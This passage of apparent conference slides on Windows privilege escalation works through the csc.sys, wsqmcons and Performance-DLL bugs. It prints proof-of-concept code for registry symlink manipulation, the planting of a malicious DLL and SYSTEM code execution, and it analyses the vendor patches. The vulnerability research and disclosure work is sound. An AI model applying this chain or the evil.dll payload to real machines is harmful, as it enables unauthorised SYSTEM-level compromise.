**`opcode 52`** Buffer DWORD[1] = 52 — the sub-opcode the kernel switch dispatches on. Layout: [8][52][srcLen][dstLen][src][dst].

**`[4]`** Thin wrapper over NtFsControlFile — crosses into csc.sys STILL impersonating. The IRP carries our token.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
43
```

## Slide 44

###### **`C:\> windbg> u csc!CscFsdDispatch`**

###### **Into the driver — route to rdbss**

**`csc.sys — CscFsdDispatch()`**

```
1   __int64 __fastcall CscFsdDispatch(PDEVICE_OBJECT a1, IRP *a2)
2   {
3     ...
4     MajorFunction = CurrentStackLocation->MajorFunction;
5     if ( MajorFunction != IRP_MJ_DEVICE_CONTROL        // [5] not an IOCTL?
6          || (... & 0xFFFFFFFB) != 0 )
7     {
8       v11 = RxFsdDispatch(CscDeviceObject, a2);        // -> rdbss.sys
9     }
10    ...
11  }
```

**`[5]`** If it’s NOT a device-control IOCTL — and our request is an FSCTL (MajorFunction 13) — it falls through.

**`mini-rdr`** csc.sys is a mini-redirector; it delegates almost all IRP handling to the shared RDBSS framework in rdbss.sys.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
44
```

## Slide 45

###### **`C:\> windbg> dps rdbss!RxFsdDispatchVector`**

###### **The dispatch-table math (why 26)**

**`rdbss.sys — RxFsdCommonDispatch()`**

```
1   // rdbss.sys
2   __int64 __fastcall RxFsdCommonDispatch(
3         __int64 (__fastcall **a1)(), PIRP a2, ...)
4   {
5     ...
6     MajorFunction = CurrentStackLocation->MajorFunction;   // == 13
7     v45 = a1[2 * MajorFunction];   // RxFsdDispatchVector[26]
8     v7  = v45(a2);                 // -> RxCommonFileSystemControl
9     ...
10  }
```

**`a1`** RxFsdDispatchVector — function pointers stored in PAIRS (2 slots per major function).

**`2 * 13 = 26`** MajorFunction 13 is IRP_MJ_FILE_SYSTEM_CONTROL and slot 26 holds its handler RxCommonFileSystemControl so it looks off-by-one until you know the slots are paired.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
45
```

## Slide 46

###### **`C:\> windbg> k   (rdbss → csc)`**

###### **Through rdbss, back into csc**

_RDBSS owns the generic FSCTL framing; CSC owns the semantics — and the bug._

```
rdbss!RxCommonFileSystemControl

rdbss!RxLowIoFsCtlShell

rdbss!RxLowIoSubmit

csc!CscFsCtl
into CSC’s own code — the bug
```

**Still** in the **impersonated** (user) context

From CscFsCtl on, every function is CSC’s own code.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
46
```

## Slide 47

###### **`C:\> ida> csc!CscFsCtl  /  CscDclIsInternalFsControl`**

###### **Is this one of our internal FSCTLs?**

**`csc.sys — CscFsCtl / CscDclIsInternalFsControl()`**

```
1   __int64 __fastcall CscFsCtl(PMRX_FCB Fcb) {
2     if ( CscDclIsInternalFsControl(Fcb) )                    // gate
3       v6 = CscDclInternalFsControl(Fcb, ...);               // -> opcode switch
4     ...
5   }
6
7   bool __fastcall CscDclIsInternalFsControl(__int64 a1) {
8     v2 = *(_QWORD *)(a1 + 48);
9     if ( *(_BYTE *)v2 == 13 && !*(_BYTE *)(v2 + 1) )
10      return *(_DWORD *)(v2 + 24) == 0x901AF;              // fsctl code
11  }
```

**`gate`** Checks MajorFunction 13, minor 0, and FsControlCode == 0x901AF.

**`0x901AF`** The usermode wrapper [4] hard-codes exactly this code — so an attacker driving the COM API always passes.

**`=>`** We enter CscDclInternalFsControl, the opcode switch where 52 lives.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
47
```

## Slide 48

###### **`C:\> ida> csc!CscDclInternalFsControl  (case 52)`**

###### **Case 52 rebuilds our two strings**

**`csc.sys — CscDclInternalFsControl()`**

```
1   CscDclpInitializeFsctlContext(v237, a1, ...);     // copy input buf
2   switch ( v237[0] )                                // first DWORD = our 52
3   {
4     case 52:                                        // [6]
5       String1.Length = *(WORD *)(v12 + 8);   // srcLen
6       String1.Buffer = (PWSTR)(v12 + 12);
7       String2.Length = *(WORD *)(v12 + 10);  // dstLen
8       String2.Buffer = (PWSTR)(String1.Length + v12 + 12);
9       CscDclMRxRebootRenameAdd(String2.Buffer, &String1, &String2);
10  }
```

**`[6]`** v237[0] is the 52 we stamped in at [3] — it selects this case.

**`re-parse`** The kernel rebuilds our two UNICODE_STRINGs from the flat buffer: String1 = source, String2 = destination.

**`length-only`** Paths are length-checked, never privilege-checked. They now feed the registry logic.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
48
```

## Slide 49

###### **`C:\> ida> csc!CscDclMRxRebootRenameAdd`**

###### **A one-line forwarder into the registry path**

**`csc.sys — CscDclMRxRebootRenameAdd()`**

```
1   __int64 __fastcall CscDclMRxRebootRenameAdd(
2         __int64 a1, __int64 a2, __int64 a3)
3   {
4     return CscRebootRenameAddEntry(
5           (struct _ERESOURCE *)(CscDevExtn + 512),   // lock
6           a2,        // source
7           a3);       // dest
8   }
```

**`forwarder`** This thin wrapper does nothing but pass the source/dest paths straight to CscRebootRenameAddEntry.

**`→ AddEntry`** …which builds the two hard-coded CSC registry paths and calls the buggy OpenKey helper (next slides).

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
49
```

## Slide 50

###### **`C:\> ida> csc!CscRebootRenameAddEntry`**

###### **Two hard-coded registry paths**

**`csc.sys — CscRebootRenameAddEntry()`**

```
1   v11.Buffer  = L"\\Registry\\Machine\\...\\CSC\\Parameters";
2   v13[1]      = L"\\Registry\\...\\CSC\\Parameters\\RebootRename";
3   ...
4   IsValidRename = CscStoreRebootRenameIsValidRename(a2, a3); // [7] UNC
5   if ( IsValidRename >= 0 ) {
6     IsValidRename = CscRebootRenamepOpenKey(&Handle, &v11, 1, 0); // [8]
7     if ( IsValidRename >= 0 )
8       IsValidRename = CscRebootRenamepAddToKey(v13, ..., a2, a3, 0); // [9]
9   }
```

**`paths`** Two fixed HKLM paths under the CSC service key — a SYSTEM-owned area of the registry.

**`[7]`** IsValidRename only checks the strings are UNC paths (why the PoC uses \\SMB\...). Not a privilege check.

**`[8][9]`** Line [9] CscRebootRenamepAddToKey ultimately calls the SAME helper (CscRebootRenamepOpenKey) internally — that helper is the bug.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
50
```

## Slide 51

###### **`C:\> ida> csc!CscRebootRenamepOpenKey   ⚠ ROOT CAUSE`**

###### **Root cause — no OBJ_FORCE_ACCESS_CHECK**

**`csc.sys — CscRebootRenamepOpenKey()`**

```
1   NTSTATUS CscRebootRenamepOpenKey(void **a1, UNICODE_STRING *a2,
2                                    char a3, _BYTE *a4)
3   {
4     ObjectAttributes.RootDirectory = 0;
5     ObjectAttributes.ObjectName    = a2;
6     ObjectAttributes.Length        = 48;
7     ObjectAttributes.Attributes    = 0x240;   // NO OBJ_FORCE_ACCESS_CHECK
8     *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0;  // NO SD
9     if ( !a3 )
10      return ZwOpenKey(a1, 0xF003F, &ObjectAttributes);
11    result = ZwCreateKey(a1, 0xF003F, &ObjectAttributes, 0,0,0, &Disp);
12    return result;
13  }
```

**`0x240`** OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE. Missing OBJ_FORCE_ACCESS_CHECK (0x400).

**`SD = NULL`** No explicit owner/DACL supplied for the new key.

**`ZwCreateKey`** NULL SD → the new key’s owner = the creating thread’s token. That thread impersonates US → a SYSTEM-service key ends up owned by the user.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
51
```

## Slide 52

###### **`C:\> whoami  (impersonated context, top to bottom)`**

###### **Why the owner becomes the user**

```
RenameItem — Impersonate(client) → token = USER

FSCTL 0x901AF … rdbss … case 52  (never reverted)

CscRebootRenamepOpenKey → ZwCreateKey(SD=NULL)

new key owner  ==  USER  ✓
```

Both must hold: **no OBJ_FORCE_ACCESS_CHECK** + **NULL SecurityDescriptor** → the kernel takes the new key’s owner straight from the impersonated request token.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
52
```

## Slide 53

###### **`C:\> ida> csc!CscRebootRenamepAddToKey`**

###### **The RebootRename subkey — same bug**

**`csc.sys — CscRebootRenamepAddToKey()`**

```
1   __int64 __fastcall CscRebootRenamepAddToKey(
2         struct _UNICODE_STRING *a1, HANDLE *a2, unsigned int *a3,
3         __int64 a4, __int64 a5, unsigned int *a6)
4   {
5     ...
6     IndexString = CscRebootRenamepOpenKey(&Handle, a1, 1, v16); // [9] same helper
7     ...
8   }
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
53
```

## Slide 54

###### **`C:\> reg> symlink RebootRename → anywhere`**

###### **Ownership → arbitrary CREATE (and a blocker)**

**THE PRIMITIVE**

We OWN **RebootRename** → make it a **REG_OPTION_CREATE_LINK** symlink → `HKLM\...\Services\Pwn`

Re-trigger CVE-2025-60705 → the driver “creates RebootRename” → follows our link → creates **an arbitrary key, owned by us.**

**THE BLOCKER**

On startup, CSC pre-creates `...\CSC\Parameters` as **SYSTEM**. We can’t own it unless it’s deleted first.

→ we need an arbitrary registry-key **DELETE**  ==  CVE-2025-59512

_(and we’ll delete twice: the pre-made Parameters, then RebootRename — so we can rebuild it as a symlink.)_

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
54
```

## Slide 55

###### **`C:\> type  ...\Consolidator`**

###### **CVE-2025-59512 — the delete we need**

- **›** We need **DELETE** to prime 60705’s create
- **›** CEIP telemetry runs many parts as **SYSTEM**
- **›** The **Consolidator** scheduled task runs **wsqmcons.exe**
- **›** wsqmcons holds the **delete primitive**
- **›** …and any user can make the task run

**`scheduled task`**

```
Customer Experience
Improvement Program

Tasks\...\Consolidator

runs: wsqmcons.exe
as:   S-1-5-18 (SYSTEM)
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
55
```

## Slide 56

###### **`C:\> type  Consolidator   (task XML)`**

###### **A SYSTEM task any user can run**

**`...\Customer Experience Improvement Program\Consolidator`**

```
1   <RegistrationInfo>
2     <SecurityDescriptor>
3     D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GRGX;;;AU)  <!-- [1] -->
4     </SecurityDescriptor>
5   </RegistrationInfo>
6   <Principals>
7     <Principal id="WinSQMAccount">
8       <UserId>S-1-5-18</UserId>                <!-- [2] runs as SYSTEM -->
9     </Principal>
10  </Principals>
11  <Actions Context="WinSQMAccount">
12    <Exec><Command>%SystemRoot%\System32\wsqmcons.exe</Command></Exec>
13  </Actions>
```

**`[1] AU GRGX`** The DACL grants Authenticated Users Generic Read/Execute — any logged-on user can run the task.

**`[2] S-1-5-18`** NT AUTHORITY\SYSTEM — the task always executes as SYSTEM.

**`=>`** A SYSTEM-principal task whose ACL explicitly lets normal users launch it. No admin, no UAC.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
56
```

## Slide 57

###### **`C:\> schtasks /run /tn "...\Consolidator"`**

###### **Triggering it — the escalation path**

_No waiting for the 6-hour timer — /run fires it immediately and synchronously._

**User**

low integrity

**schtasks.exe**

**Task Scheduler**

schedsvc.dll · SYSTEM

**svchost.exe**

Schedule

**wsqmcons.exe**

SYSTEM

◄ runs **Unregister PathForCommonUpload()**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
57
```

## Slide 58

###### **`C:\> ida> wsqmcons!UnregisterPathForCommonUpload`**

###### **SHDeleteKeyW on a user-writable key**

**`wsqmcons.exe — UnregisterPathForCommonUpload()`**

```
1   __int64 __fastcall UnregisterPathForCommonUpload(char *a1) {
2     ...
3     RegOpenKeyExW(
4         HKLM,
5         "Software\\Microsoft\\SQMClient\\CommonUploader\\Paths",  // [1]
6         0,
7         0x20106,                       // [2] no REG_OPTION_OPEN_LINK
8         &hKey);
9     SHDeleteKeyW(hKey, pszSubKey);  // [3] recursive delete, as SYSTEM
10    ...
11  }
```

**`[1]`** Opens a key that ordinary users have WRITE access to.

**`[2]`** No REG_OPTION_OPEN_LINK — so if Paths is a symlink, the open FOLLOWS it.

**`[3]`** SHDeleteKeyW recursively deletes the opened key and every subkey — as SYSTEM. That’s the primitive.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
58
```

## Slide 59

###### **`C:\> reg add ...\CommonUploader\Paths /t REG_LINK`**

###### **From symlink to arbitrary delete**

**HKLM\...\Paths**

user has WRITE

symlink

**ANY target key**

that we want gone

**`wsqmcons.exe  (SYSTEM)`**

```
RegOpenKeyExW(..., 0x20106, ...)   // no OPEN_LINK → follows link
SHDeleteKeyW(hKey, ...)            // deletes <ANY TARGET KEY>

⇒ Arbitrary Registry Key Deletion  (as SYSTEM)
```

A confused deputy: **we control the pointer, SYSTEM does the deleting.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
59
```

## Slide 60

###### **`C:\> # poc: create-a-key-I-own, anywhere`**

###### **Chain #2 — the full six-step chain**

**1. StartCscService()**

creates CSC\Parameters

**2. DELETE Parameters**

CVE-2025-59512

**3. CREATE RebootRename**

user-owned · 60705

**4. DELETE RebootRename**

CVE-2025-59512

**5. REG_LINK symlink**

→ target service key

**6. CREATE target**

an owned key, anywhere

We must delete RebootRename before we can turn it into a symlink. **Delete → create → delete → link → create. Zero memory corruption.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
60
```

## Slide 61

```
C:\> net use  \\<ip>\TestShare
```

###### **One precondition: an SMB share you control**

_CSC only acts on a rename of a network file — so the chain needs a UNC path._

**You** low-priv · cmdkey /add → **\\<ip>\TestShare** shares 1.txt · 2.txt → **RenameItem()** 1.txt → 2.txt · into csc.sys

**`CscStoreRebootRenameIsValidRename`** [7] rejects anything that isn't a **UNC path** — so both rename strings must be `\\ip\share\…`

No SMB share you control → no chain. Free on a LAN; a real hurdle when it's locked down.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
61
```

## Slide 62

###### **`C:\> ida> main()  —  prime the target`**

###### **PoC — clean the stale symlink**

`exploit  —  main()   (housekeeping)`

```
1  StartCscService();                                        // [1] Parameters now exists
2  system("cmdkey /add ...");                                 // UNC creds for CSC
3
4  WCHAR* path2 = L"SYSTEM\\...\\CSC\\Parameters\\RebootRename";
5
6  ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path2,
7          REG_OPTION_OPEN_LINK, DELETE, &hKey2);    // [2] open the LINK
8  if (hKey2) {
9      ret = NtDeleteKey(hKey2);                              // [3]
10     printf("[+] stale symbolic link deleted\n");
11 }
```

**`[1]`** Start CSC so its Parameters key exists to work against.

###### **`[2][3]`**

REG_OPTION_OPEN_LINK opens the symlink NODE itself; [3] NtDeleteKey deletes that node — clearing the stale link instead of following it. **`irony`** Here we deliberately use the exact flag whose ABSENCE in wsqmcons.exe created CVE-2025-59512.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
62
```

## Slide 63

```
C:\> ida> main()  —  the create/delete/link core
```

###### **PoC — delete, create, plant the link**

`exploit  —  main()   (the dance, in code)`

```
1  deletekey(path);        // 59512: delete ...\CSC\Parameters
2  createkey(0);            // 60705: create RebootRename  (owner=user)
3  deletekey(path2);        // 59512: delete RebootRename
4
5  RegCreateKeyExW(HKEY_LOCAL_MACHINE, path2, 0, nullptr,
6      REG_OPTION_CREATE_LINK, KEY_WRITE, nullptr, &hKey2, nullptr); // [4]
7
8  WCHAR* path3 = L"\\REGISTRY\\MACHINE\\SYSTEM\\...\\Services\\Pwn";
9  RegSetValueExW(hKey2, L"SymbolicLinkValue", 0, REG_LINK,          // [5]
10     (BYTE*)path3, wcslen(path3)*sizeof(WCHAR));
11 createkey(0);            // [6] 60705: create follows link -> Pwn
```

**`[4]`** REG_OPTION_CREATE_LINK makes RebootRename a symbolic-link key instead of a normal key.

**`[5]`** SymbolicLinkValue (REG_LINK) points at the KERNEL path \REGISTRY\MACHINE\... — Win32 HKLM\ notation won't resolve.

**`[6]`** Fire 60705 again: CSC "creates" RebootRename, follows our link, creates Pwn owned by us.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
63
```

## Slide 64

```
C:\> so... now what?
```

**We own a key — how does that become SYSTEM?** _An arbitrary registry key we control isn't power — yet._

**an owned key** arbitrary path · we set the ACL → **?** → **SYSTEM** the goal — still out of reach

We need a **SYSTEM service that blindly trusts a registry key we can create**.  That's exactly what a **Performance DLL** is.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
64
```

## Slide 65

```
C:\> reg query  ...\Services\<svc>\Performance
```

###### **We own a key — but that isn't SYSTEM yet**

_The dance gave us an arbitrary registry key we own. A key isn't code exec — except this one (h/t itm4n)._

`HKLM\...\Services\<svc>\Performance`

```
Library = C:\...\evil.dll
Open    = OpenPerformanceData
Collect = CollectPerformanceData
Close   = ClosePerformanceData

a SYSTEM perf collector reads these
and LoadLibrary()s Library in-process
```

- **›** Point our owned key at a service's **Performance** subkey

- **› Library**: any DLL → LoadLibrary'd by SYSTEM. No signature check.

- **› Open/Collect/Close**: exports the collector calls — any one runs our code.

- **›** So the registry key **becomes SYSTEM code exec**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
65
```

## Slide 66

```
C:\> ida> exploit main()  —  pivot the link
```

###### **Retarget the chain at wmiApSrv\Performance**

```
exploit  —  main()
1  int main() {
2      ...
3      WCHAR* path3 =
4        L"\\REGISTRY\\MACHINE\\SYSTEM\\...\\wmiApSrv\\Performance"; // [1]
5
6      RegSetValueExW(hKey2, L"SymbolicLinkValue", 0, REG_LINK,      // [2]
7          (BYTE*)path3, wcslen(path3)*sizeof(WCHAR));
8      createkey(0);                                                  // [3]
9
10     exploit();                                                     // [4]
11 }
```

**`[1]`** Only ONE value changes between harmless PoC and SYSTEM shell: the symlink target.

**`[2]`** Point SymbolicLinkValue (REG_LINK) at wmiApSrv\Performance — the WMI Performance Adapter, whose collector loads Performance-key DLLs.

**`[3][4]`** Fire 60705 → we now OWN wmiApSrv\Performance → hand off to exploit().

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
66
```

## Slide 67

```
C:\> ida> exploit()
```

###### **Land the DLL — write the Performance values**

```
exploit.exe  —  exploit()
1  int exploit() {
2    RegCreateKeyExW(HKLM, L"SYSTEM\\...\\wmiApSrv\\Performance", ...,
3        KEY_WRITE | KEY_WOW64_32KEY, ..., &hKey, ...);
4
5    RegSetValueExA(hKey, "Library", 0, REG_SZ, DLL_PATH,   ...);   // [1]
6    RegSetValueExA(hKey, "Open",    0, REG_SZ, "OpenPerfData", ...); // [2]
7    RegSetValueExA(hKey, "Collect", 0, REG_SZ, "CollectPerfData",...);
8    RegSetValueExA(hKey, "Close",   0, REG_SZ, "CloseerformanceData",..);
9
10   CopyFileA("evil.dll", DLL_PATH, FALSE);                          // [3]
11   system("powershell -Command \"Get-WmiObject Win32_Perf\""); // [4]
12 }
```

**`[1][3]`** Library points at DLL_PATH, where [3] CopyFileA drops evil.dll — the file the SYSTEM collector will LoadLibrary. We own the key, so writes succeed.

- **`[2]`** Open/Collect/Close name exports the collector resolves. (Close's value keeps the real PoC typo — harmless: DllMain already ran.)

- **`[4]`** Get-WmiObject Win32_Perf forces the WMI Performance Adapter (SYSTEM) to load every registered perf Library — including ours.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
67
```

## Slide 68

```
C:\> ida> evil.dll!DllMain
```

###### **The payload — DllMain runs as SYSTEM**

```
evil.dll  —  payload
1  extern "C" __declspec(dllexport)
2  DWORD APIENTRY OpenPerfData(LPWSTR pContext) {
3      system("whoami /all > c:\\windows\\system32\\cmdlog.txt");  // [1]
4      exit(0);
5  }
6  BOOL __stdcall DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
7      if (reason == DLL_PROCESS_ATTACH) {
8          RevertToSelf();                                          // [2]
9          system("whoami /all > c:\\windows\\system32\\cmdlog.txt"); // [3]
10     }
11     return TRUE;
12 }
```

**`load = exec`** LoadLibrary maps evil.dll → DllMain fires inside the SYSTEM collector. **`belt+braces`** DllMain is the belt; Open/Collect/Close are the suspenders — whichever runs first detonates.

**`[1][2][3]`** The export [1] runs system() directly; DllMain [2][3] does RevertToSelf → system() first. Either way it executes with the real SYSTEM token — the System32 write is proof.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
68
```

## Slide 69

```
C:\> type  C:\Windows\System32\cmdlog.txt
```

###### **Payoff — nt authority\system**

`C:\Windows\System32\cmdlog.txt`

```
USER INFORMATION
User Name            SID
nt authority\system  S-1-5-18
PRIVILEGES
SeTcbPrivilege          Enabled
SeDebugPrivilege        Enabled
SeImpersonatePrivilege  Enabled
SeLoadDriverPrivilege   Disabled
```

**›** Start: standard user, zero admin. **›** End: **SYSTEM**. **›** 100% logic, 0% memory corruption. **›** Win11 25H2 · 26200.6899

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
69
```

## Slide 70

```
C:\> ▶ play  chain2_demo.mp4
```

##### **Demo — Chain #2**

standard user → DELETE + CREATE registry key → Performance DLL → **SYSTEM**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
70
```

## Slide 71

```
C:\> cd .\patches
```

### **Patches — and why the chains die**

_Three of the four were fixed. Here's how each landed — and why you can't just route around it._

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
71
```

## Slide 72

```
C:\> bindiff  IpsPlugin.dll   (KB5037768)
```

###### **Patch 1 — Windows Search (CVE-2024-30033)**

```
patched  —  CConnectionWaitList::Load()
1  bool __fastcall CConnectionWaitList::Load( ... )
2  {
3      ...
4  +   if ( !FeatureImpl<Feature_3776113982>::IsEnabled() )
5  +   {
6          CUserProfilePathBuilder::SetUser(v14, a2);
7          if ( CUserProfilePathBuilder::FileExists(v14) )
8            DeleteFileW(pszPath);          // the delete, now gated
9  +   }
10     ...
11 }
```

**`WIL gate`** The whole SetUser/FileExists/DeleteFileW block is wrapped in a feature-flag check.

**`disabled`** With Feature_3776113982 off (the default), the delete routine never runs.

**`no sanitizer`** They didn't add symlink validation — they just stopped calling the dangerous code.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
72
```

## Slide 73

```
C:\> bindiff> CscRebootRenamepOpenKey  (patched)
```

###### **Patch 2 — csc.sys (CVE-2025-60705)**

```
csc.sys  —  CscRebootRenamepOpenKey()  patched
1  +  if ( Feature_2522651962__IsEnabled() )
2  +  {
3  +    if ( a3 ) {
4  +      result = CscRebootRenamepCreateSecurityDescriptor(&P); // SYSTEM SD
5  +      if ( result < 0 ) return result;
6  +      ObjectAttributes.Attributes        = 576;   // still 0x240
7  +      ObjectAttributes.SecurityDescriptor = P;    // explicit SYSTEM SD
8  +      v10 = ZwCreateKey(KeyHandle, 0xF003F, &ObjectAttributes, ...);
9  +    }
10 +    if ( P ) ExFreePoolWithTag(P, 'CsrR');   // 0x52727343
11 +  }
```

**`SD`** The patch builds a LocalSystem SD and sets .SecurityDescriptor = P before ZwCreateKey.

**`not the flag`** They did NOT add OBJ_FORCE_ACCESS_CHECK (Attributes stays 0x240) — they fixed the ownership leak directly. **`structural`** This one is a real fix: the key is now SYSTEM-owned regardless of impersonation.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
73
```

## Slide 74

```
C:\> bindiff> UnregisterPathForCommonUpload
```

###### **Patch 3 — wsqmcons.exe (CVE-2025-59512)**

```
wsqmcons.exe  —  UnregisterPathForCommonUpload()  patched
1  __int64 __fastcall UnregisterPathForCommonUpload(char *a1)
2  {
3      ...
4  +   if ( FeatureImpl<Feature_804821304>::__private_IsEnabled(...) )
5  +     return 0LL;                     // [1] early-out before the delete
6      ...
7      RegOpenKeyExW(HKLM, "...\\CommonUploader\\Paths", 0, 0x20106, &hKey);
8      SHDeleteKeyW(hKey, pszSubKey);
9      ...
10 }
```

**`[1]`** The whole function is gated behind a WIL feature flag; when enabled it returns immediately. **`no-op`** Not a symlink check, not an ACL fix — the RegOpenKeyExW and SHDeleteKeyW pair simply never runs.

**`same trick`** The same FeatureImpl mechanism as the WSearch patch. The dead code stays in the binary.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
74
```

## Slide 75

```
C:\> why can't I just bypass it?
```

###### **Why the patched chains stay dead**

| CVE / Fix | Note |
|---|---|
| **`CVE-2024-30033`** delete block gated off | No code path reaches the sink anymore — you'd have to flip a feature flag you don't control. |
| **`CVE-2025-60705`** ZwCreateKey gets a SYSTEM SD | The key is SYSTEM-owned no matter who's impersonated. The ownership confusion is structurally closed. |
| **`CVE-2025-59512`** function early-returns | SHDeleteKey never executes — the arbitrary-delete primitive is simply gone. |

…except **`ZDI-24-1098`** — the KILL was never serviced. Still live today, so anything that leans on it stays reusable.

2 of 3 fixes are **`FeatureImpl`** band-aids — dead code, not a sanitizer. Worth watching if a general fix ever re-enables the path.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
75
```

## Slide 76

```
C:\> cat scoreboard.txt
```

##### **Scoreboard — what got fixed?**

| CVE / Bug | Component | Status | Notes |
|---|---|---|---|
| **CVE-2024-30033** | Search Service file delete | `PATCHED` | delete routine gated by Feature_3776113982 (KB5037768) |
| **ZDI-24-1098** | WerSvc arbitrary kill | `WON'T FIX` | publicly disclosed · still live today ⚠ |
| **CVE-2025-60705** | csc.sys key ownership | `PATCHED` | driver stamps a LocalSystem SecurityDescriptor |
| **CVE-2025-59512** | wsqmcons key delete | `PATCHED` | UnregisterPathForCommonUpload feature-gated off |

The pattern: **`"FeatureImpl"`** flags are Microsoft's temporary Patch-Tuesday band-aids — worth watching for bypasses.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
76
```

## Slide 77

```
C:\> diff  chain1  chain2
```

##### **Two chains, one blueprint**

_Different components — the same recipe underneath._

| | **`CHAIN #1`** service-level | **`CHAIN #2`** kernel + task |
|---|---|---|
| **weak primitive:** | arbitrary file DELETE  `Windows Search · CVE-2024-30033` | arbitrary registry CREATE  `csc.sys · CVE-2025-60705` |
| **+ the amplifier:** | a free process KILL  `WerSvc · ZDI-24-1098 → deterministic` | an arbitrary registry DELETE  `CEIP task · CVE-2025-59512` |
| **↓** | **→ SYSTEM** via Config.Msi rollback | **→ SYSTEM** via Performance-DLL hijack |

A weak primitive + something that makes it fire on demand = **reliable SYSTEM.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
77
```

## Slide 78

###### **`C:\> cat takeaways.txt`**

##### **Takeaways**

**`1` Read bugs as primitives**

Kill, delete, create, redirect — partial control over privileged resources.

**`2` Chaining is the exploit** Individually “low”; composed, they are deterministic SYSTEM.

**`3` Impersonate-then-create** A Zw* create with NULL SD while impersonating = repeatable owner confusion.

**`4` Won’t-fix = durable** An unpatched primitive (ZDI-24-1098) is the best kind of dependency.

_Go find partial control over a privileged resource. Then find a friend for it._

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
78
\```

## Slide 79

\```
C:\> git shortlog -sne
\```

##### **Acknowledgements**

_Standing on the shoulders of researchers who share their tricks._

**Bocheng Xiang  @crispr_x** co-speaker — we built this talk together

**Wh04m1001** Config.Msi / .rbs trick (CVE-2023-21752)

**Tianlin Zhang  @t0zhang** Chain #2 bugs — csc.sys + CEIP task

**James Forshaw  @tiraniddo** symlink & token research

**Abdelhamid Naceri** arbitrary-delete → EoP trick (Config.Msi)

**Zero Day Initiative** ZDI advisories & disclosure

**itm4n** Performance-DLL / RpcEptMapper writeups

_…and everyone who argues about bugs online._

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
79
\```

## Slide 80

## **Thank you!  Questions?**

```
heegong@defcon: ~
C:\> echo $?
0    # SYSTEM, reliably.

C:\> _
```

###### **HeeChan Kim** **`@heegong123`**

```
DEF CON 34 · Main Stage · slides + PoC notes on request
```

```
80
```

